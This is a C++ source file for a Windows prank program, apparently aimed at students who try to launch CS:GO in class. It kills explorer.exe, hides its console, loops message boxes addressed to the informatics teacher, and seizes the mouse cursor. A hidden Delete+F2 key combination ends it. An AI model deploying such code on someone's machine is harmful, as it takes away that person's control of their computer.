#include <iostream>
#include <Windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <conio.h>
#include <cstdlib>
#include <winuser.h>
#include <windowsx.h>
#include <ctime>
#include <cassert>
#include <chrono>
#include <thread>
#include "resource.h"
#pragma comment(lib, "winmm.lib" )

int move_index = GetSystemMetrics(SM_CYSCREEN) / 36;

void MouseMover(int x, int y, POINT pos)
{
    for (int i = 0; i < 500; i += move_index)
    {
        SetCursorPos(pos.x + i, pos.y);
        Sleep(1);
    }
    GetCursorPos(&pos);
    for (int i = 0; i < 300; i += move_index)
    {
        SetCursorPos(pos.x, pos.y - i);
        Sleep(1);
    }
    GetCursorPos(&pos);
    for (int i = 0; i < 500; i += move_index)
    {
        SetCursorPos(pos.x - i, pos.y);
        Sleep(1);
    }
    GetCursorPos(&pos);
    for (int i = 0; i < 300; i += move_index)
    {
        SetCursorPos(pos.x, pos.y + i);
        Sleep(1);
    }

}

void EmegregcyExit()
{
    while (true)
    {
        if (GetAsyncKeyState(VK_DELETE) && GetAsyncKeyState(VK_F2))
        {
            system("start explorer");
            exit(0);
        }
        Sleep(100);
    }
}

void CloseAllWindows()
{
    HWND lHwnd = FindWindow(L"Shell_TrayWnd", NULL);
    SendMessage(lHwnd, WM_COMMAND, 419, 0);
}

void SpamWindows()
{
    while (true) MessageBox(NULL, L"Этот красавчик на уроке пытался запустить игру CS:GO!", L"Уважаемый учитель информатики!", MB_OK);
}

int main()
{
    CloseAllWindows();
    Sleep(100);

    HANDLE h_explorer;
    HWND hwnd = FindWindow(L"Shell_TrayWnd", NULL);
    DWORD pid = {};
    GetWindowThreadProcessId(hwnd, &pid);
    h_explorer = OpenProcess(PROCESS_TERMINATE, false, pid);
    TerminateProcess(h_explorer, 1);
    CloseHandle(h_explorer);

    int screen_x = GetSystemMetrics(SM_CXSCREEN);

    int screen_y = GetSystemMetrics(SM_CYSCREEN);
    POINT cursor;
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    std::thread emegrexit(EmegregcyExit);
    std::thread spamwindows(SpamWindows);
    PlaySound(MAKEINTRESOURCE(IDR_WAVE1), NULL, SND_RESOURCE | SND_ASYNC);
    while (true)
    {
        GetCursorPos(&cursor);
        MouseMover(screen_x, screen_y, cursor);
    }
}